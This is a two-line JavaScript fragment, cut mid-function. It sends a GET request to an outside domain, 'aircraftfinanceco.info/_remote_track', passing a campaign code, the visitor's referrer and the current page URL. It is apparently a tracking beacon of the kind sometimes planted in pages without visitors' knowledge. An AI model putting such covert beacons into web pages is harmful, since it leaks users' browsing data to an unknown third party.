...
xhr.open("GET", "https://aircraftfinanceco.info/_remote_track?campaign=" + escape("yFlcR7JKiz") + "&referrer=" + escape(document.referrer) + "&uri=" + escape(window.location.href), true);
xhr.onload = function() {
